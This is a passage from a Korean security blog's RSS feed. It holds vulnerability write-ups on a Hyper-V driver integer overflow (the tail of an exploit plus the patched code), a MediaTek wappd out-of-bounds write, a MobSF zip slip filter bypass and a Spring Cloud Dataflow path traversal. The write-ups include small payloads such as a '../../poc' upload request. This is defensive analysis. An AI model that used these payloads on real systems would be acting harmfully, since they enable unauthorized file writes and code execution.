class="hljs-number">2000</span>);<span class="hljs-keyword">if</span> (!DeviceIoControl(VidExo, RECV_IOCTL, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, buf, <span class="hljs-number">0x20</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RECV_IOCTL failed(%x)\n&quot;</span>, GetLastError());}<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>&#xD328;&#xCE58;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC5F0;&#xC0B0; &#xACFC;&#xC815; &#xC911;&#xAC04;&#xC5D0;&#xC11C; Integer Overflow&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="VidExoBrokerIoctlReceive-Vid-sys-10-0-22621-3880"><a href="#VidExoBrokerIoctlReceive-Vid-sys-10-0-22621-3880" class="headerlink" title="VidExoBrokerIoctlReceive (Vid.sys 10.0.22621.3880)"></a><code>VidExoBrokerIoctlReceive</code> (Vid.sys 10.0.22621.3880)</h2><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VidExoBrokerIoctlReceive</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        __int64 VidExoObj,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        BrokerIrpDataHeader *Dest,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> OuputLen,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a5)</span></span><span class="hljs-function"></span>{...  v30 = <span class="hljs-number">0</span>;  v7 = VidExoObj;  ReceivedIRP = (IRP *)VidExoBrokerpFindAndDequeueSendIrpForFileObject(VidExoObj, a2);  v9 = ReceivedIRP;  <span class="hljs-keyword">if</span> ( !ReceivedIRP )  {    ...  }  Source = (BrokerIrpDataHeader *)ReceivedIRP-&gt;AssociatedIrp.SystemBuffer;  <span class="hljs-keyword">if</span> ( OuputLen &lt; <span class="hljs-number">0x10</span> )  {    ...  }  Dest-&gt;HeaderSize = <span class="hljs-number">16</span>;  Dest-&gt;NumHandles = Source-&gt;NumHandles;  IsEnabledDeviceUsage = Feature_2871081274__private_IsEnabledDeviceUsage();  NumHandles = Source-&gt;NumHandles;  <span class="hljs-keyword">if</span> ( IsEnabledDeviceUsage )  {    v15 = <span class="hljs-number">8</span>i64 * NumHandles;    <span class="hljs-keyword">if</span> ( v15 &gt; <span class="hljs-number">0xFFFFFFFF</span> || (v16 = v15 + <span class="hljs-number">16</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v15 &gt;= <span class="hljs-number">0xFFFFFFF0</span>) )<span class="hljs-comment">//[1] Integer Overflow Check</span>    {      v10 = <span class="hljs-number">-1073741306</span>;      VidTraceErrorInternal0(<span class="hljs-string">&quot;VidExoBrokerIoctlReceive&quot;</span>, <span class="hljs-string">&quot;onecore\\vm\\vid\\sys\\driver\\videxobroker.c&quot;</span>, <span class="hljs-number">220</span>);      <span class="hljs-keyword">goto</span> LABEL_25;    }    Dest-&gt;DataOffset = v16;    Dest-&gt;DataLen = Source-&gt;DataLen;    TotalLength = v16 + Source-&gt;DataLen;    <span class="hljs-keyword">if</span> ( TotalLength &lt; v16 )                    <span class="hljs-comment">//[2] Integer Overflow Check</span>    {      v10 = <span class="hljs-number">-1073741306</span>;      VidTraceErrorInternal0(<span class="hljs-string">&quot;VidExoBrokerIoctlReceive&quot;</span>, <span class="hljs-string">&quot;onecore\\vm\\vid\\sys\\driver\\videxobroker.c&quot;</span>, <span class="hljs-number">230</span>);      <span class="hljs-keyword">goto</span> LABEL_25;    }  }  ...}</code></pre><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/5EcfMnAgRqg?si=hU_fnM001Ft5CP6_" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hyper-v/">hyper-v</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-38080/">CVE-2024-38080</category>
      
      <category domain="https://hackyboiz.github.io/tags/Hyper-V-1-day-Class/">Hyper-V 1-day Class</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/01/pwndorei/hyperv-1dayclass_CVE-2024-38080/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-20017 : wappd의 OOB Write로 인한 Remote Code Execution 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/31/j0ker/2024-08-31/</link>
      <guid>https://hackyboiz.github.io/2024/08/31/j0ker/2024-08-31/</guid>
      <pubDate>Sat, 31 Aug 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.coffinsec.com/0day/2024/08/30/exploiti</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html">4 exploits, 1 bug: exploiting cve-2024-20017 4 different ways</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Affected Chipsets: MediaTek MT6890, MT7915, MT7916, MT7981, MT7986</li><li>Affected Software Versions: SDK version 7.4.0.1 and before (for MT7915) / SDK version 7.6.7.0 and before (for MT7916, MT7981 and MT7986) / OpenWrt 19.07, 21.02</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2024-20017&#xC740; &#xBBF8;&#xB514;&#xC5B4;&#xD14D; wlan &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Out of Bound Write &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C;&#xB294; MediaTek MT7622/MT7915 SDK &#xBC0F; RTxxxx SoftAp &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBC88;&#xB4E4; &#xC911; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB370;&#xBAAC;&#xC778; wappd&#xC5D0;&#xC11C;&#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBA70;, Ubiquiti, Xiaomi, Netgear &#xB4F1; Wi-Fi6&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4;&#xC790;&#xB294; Netgear WAX206&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xC2DC;&#xBA74; <a href="https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html">&#xC6D0;&#xAE00;</a>&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; UDP &#xD328;&#xD0B7;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD0B7;&#xC774; &#xC218;&#xC2E0;&#xB418;&#xBA74; <code>IAPP_RcvHandler()</code>&#xB294; <code>IAPP_RcvHandlerUdp()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC218;&#xC2E0;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD560; <code>pPktBuf</code> &#xD3EC;&#xC778;&#xD130;&#xB97C;&#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. <code>IAPP_RcvHandler()</code>&#xB294; <code>recvfrom()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; UDP &#xC18C;&#xCF13;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xC77D;&#xD614;&#xB2E4;&#xBA74; &#xB370;&#xC774;&#xD130;&#xB97C; <code>struct IappHdr</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xACE0; command &#xD544;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xAC12;&#xC774; 0x50&#xC778; &#xACBD;&#xC6B0;, <code>IAPP_RcvHandlerSSB()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">pSendSB = (RT_IAPP_SEND_SECURITY_BLOCK *) pPktBuf; <span class="hljs-comment">// &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130; &#xD3EC;&#xC778;&#xD130; &#xCE90;&#xC2A4;&#xD305;</span>BufLen = <span class="hljs-keyword">sizeof</span>(OID_REQ);pSendSB-&gt;Length = NTOH_S(pSendSB-&gt;Length);BufLen += FT_IP_ADDRESS_SIZE + IAPP_SB_INIT_VEC_SIZE + pSendSB-&gt;Length;IAPP_CMD_BUF_ALLOCATE(pCmdBuf, pBufMsg, BufLen); <span class="hljs-comment">// &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xBCF5;&#xC0AC;</span><span class="hljs-keyword">if</span> (pBufMsg == <span class="hljs-literal">NULL</span>)  <span class="hljs-keyword">return</span>;<span class="hljs-comment">/* End of if */</span><span class="hljs-comment">/* command to notify that a Key Req is received */</span>DBGPRINT(RT_DEBUG_TRACE, <span class="hljs-string">&quot;iapp&gt; IAPP_RcvHandlerSSB\n&quot;</span>);OidReq = (POID_REQ) pBufMsg;OidReq-&gt;OID = (RT_SET_FT_KEY_REQ | OID_GET_SET_TOGGLE);<span class="hljs-comment">/* peer IP address */</span>IAPP_MEM_MOVE(OidReq-&gt;Buf, &amp;PeerIP, FT_IP_ADDRESS_SIZE);<span class="hljs-comment">/* nonce &amp; security block */</span>IAPP_MEM_MOVE(OidReq-&gt;Buf+FT_IP_ADDRESS_SIZE,      pSendSB-&gt;InitVec, IAPP_SB_INIT_VEC_SIZE);IAPP_MEM_MOVE(OidReq-&gt;Buf+FT_IP_ADDRESS_SIZE+IAPP_SB_INIT_VEC_SIZE,      pSendSB-&gt;SB, pSendSB-&gt;Length);<span class="hljs-comment">// <span class="hljs-doctag">BUG:</span> overflow occurs here</span>IAPP_MEM_MOVE(&amp;kdp_info, pSendSB-&gt;SB, pSendSB-&gt;Length);</code></pre><p>&#xC804;&#xB2EC;&#xBC1B;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; <code>pSendSB</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD0B7; &#xB0B4; &#xB370;&#xC774;&#xD130;&#xC640; &#xAE38;&#xC774;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>pSendSB-&gt;Length</code>&#xC640; <code>pSendSB-&gt;SB</code>&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xAE38;&#xC774;&#xB9CC;&#xD07C; <code>kdp_info</code>&#xC5D0; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>kdp_info</code>&#xC758; &#xD06C;&#xAE30;&#xB294; 167 &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xC774; &#xCF54;&#xB4DC; &#xC774;&#xC804;&#xC5D0; &#xD328;&#xD0B7; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC740; 1600 &#xBC14;&#xC774;&#xD2B8;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0;&#xB9CC; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; <code>kdp_info</code>&#xC758; &#xD06C;&#xAE30; &#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xC368; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/mediatek/">mediatek</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-20017/">CVE-2024-20017</category>
      
      <category domain="https://hackyboiz.github.io/tags/wappd/">wappd</category>
      
      <category domain="https://hackyboiz.github.io/tags/Netgear/">Netgear</category>
      
      <category domain="https://hackyboiz.github.io/tags/WAX206/">WAX206</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/31/j0ker/2024-08-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-43399: MobSF의 Zip slip 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/</link>
      <guid>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/</guid>
      <pubDate>Wed, 28 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MobSF &lt; 4.0.7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MobSF(Mobile Security Framework)&#xB294; android, ios, Windows &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB300;&#xC0C1;&#xC758; &#xC815;&#xC801;/&#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC790;&#xB3D9;&#xD654;&#xB41C; pen testing &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xACF5;&#xD558;&#xB294; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; <code>.a</code> &#xD655;&#xC7A5;&#xC790;&#xC758; static library&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD55C;&#xB370; &#xC774;&#xB54C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD30C;&#xC77C; &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; zip slip &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/28/pwndorei/2024-08-28/image.png" alt="image.png"></p><p>&#xC704;&#xB294; <code>mobsf/StaticAnalyzer/views/common/shared_func.py</code>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC758; &#xC77C;&#xBD80;&#xB85C; static library&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. 188&#xBC88; &#xB77C;&#xC778;&#xC744; &#xBCF4;&#xBA74; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC5D0;&#xC11C; <code>../</code>&#xC640; <code>..\</code>&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xB098; &#xC774;&#xB294; <code>&#x2026;.//</code>&#xC640; <code>&#x2026;.\\</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; zip slip&#xC744; &#xD1B5;&#xD55C; path traversal&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; <code>.bashrc</code> &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xBC29;&#xBC95; &#xB4F1;&#xC73C;&#xB85C; Remote code execution&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/zip-slip/">zip-slip</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/MobSF/">MobSF</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-22263: Spring Cloud Dataflow의 Path Traversal으로 인한 임의 파일 쓰기 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/</link>
      <guid>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/</guid>
      <pubDate>Sat, 24 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/spring-cloud-data-flow-expl</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.securelayer7.net/spring-cloud-data-flow-exploit/">https://blog.securelayer7.net/spring-cloud-data-flow-exploit/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Spring Cloud Dataflow &lt; 2.11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cloud Foundry/Kubernetes&#xC5D0;&#xC11C; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xCC98;&#xB9AC; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD55C; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC11C;&#xBE44;&#xC2A4; &#xAE30;&#xBC18; &#xD234;&#xD0B7;&#xC778; Spring Cloud Dataflow &#xC5D0;&#xC11C; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC4F0;&#xAE30; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD328;&#xD0A4;&#xC9C0; &#xC5C5;&#xB85C;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; Skipper &#xC11C;&#xBC84; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778;  <em>**</em><code>PackageService.java</code>  &#xBAA8;&#xB4C8;&#xC758; &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><blockquote><p>Skipper&#xB294; &#xC5EC;&#xB7EC; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; Spring Boot &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xB77C;&#xC774;&#xD504;&#xC0AC;&#xC774;&#xD074;&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB294; &#xD234;&#xC784;.</p></blockquote><p><code>/api/package/upload</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC758; Skipper &#xC11C;&#xBC84; API&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC5C5;&#xB85C;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">@Transactionalpublic PackageMetadata upload(UploadRequest uploadRequest) {    validateUploadRequest(uploadRequest);</code></pre><p><code>upload</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>UploadRequest</code>&#xB97C; <code>validateUploadRequest</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">private <span class="hljs-keyword">void</span> validateUploadRequest(UploadRequest uploadRequest) {    Assert.notNull(uploadRequest.getRepoName(), <span class="hljs-string">&quot;Repo name can not be null&quot;</span>);    Assert.notNull(uploadRequest.getName(), <span class="hljs-string">&quot;Name of package can not be null&quot;</span>);    Assert.notNull(uploadRequest.getVersion(), <span class="hljs-string">&quot;Version can not be null&quot;</span>);    <span class="hljs-comment">// Other checks...</span>}</code></pre><p><code>validateUploadRequest</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xD328;&#xD0A4;&#xC9C0; &#xD30C;&#xC77C;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; null &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">Path packageFile = Paths.get(packageDir.getPath() + File.separator + uploadRequest.getName() + <span class="hljs-string">&quot;-&quot;</span> + uploadRequest.getVersion() + <span class="hljs-string">&quot;.&quot;</span> + uploadRequest.getExtension());</code></pre><p>validation &#xC774;&#xD6C4; <code>upload</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; &#xC0AC;&#xC6A9;&#xD574; <code>packgeFile</code> &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD574; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xD328;&#xD0A4;&#xC9C0;&#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC80;&#xC99D; &#xBD80;&#xC871;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>validateUploadRequest(uploadReqeust)</code> &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C;, <code>uploadRequest</code>&#xC758; &#xC2E4;&#xC81C; &#xACBD;&#xB85C;&#xAC00; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC0DD;&#xC131;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xAC80;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBBC0;&#xB85C; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xAC80;&#xC99D;&#xD560; &#xC218; &#xC5C6;&#xC74C;</li><li><code>validateUploadRequest</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; null &#xD328;&#xD0A4;&#xC9C0; &#xAC80;&#xC0AC; &#xC678; path traversal check&#xC640; &#xAC19;&#xC740; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</li><li><code>Path packageFile</code> &#xAD6C;&#xC131;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xC778;&#xD48B;&#xC778; <code>uploadRequest</code>&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xAD6C;&#xC131;&#xD568;.</li></ol><p>&#xACF5;&#xACA9;&#xC790;&#xB294; name &#xD544;&#xB4DC;&#xC5D0; path traversal &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; uploadRequest &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">uploadRequest = {    <span class="hljs-string">&quot;repoName&quot;</span>: repoName,    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;../../poc&quot;</span>,    <span class="hljs-string">&quot;version&quot;</span>: version,    <span class="hljs-string">&quot;extension&quot;</span>: <span class="hljs-string">&quot;zip&quot;</span>,    <span class="hljs-string">&quot;packageFileAsBytes&quot;</span>: packageFileAsBytes}</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><code>validateUploadRequest(uploadReqeust)</code> &#xD638;&#xCD9C; &#xC804; &#xC5C5;&#xB85C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC911; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD568;.</p> <pre><code class="hljs 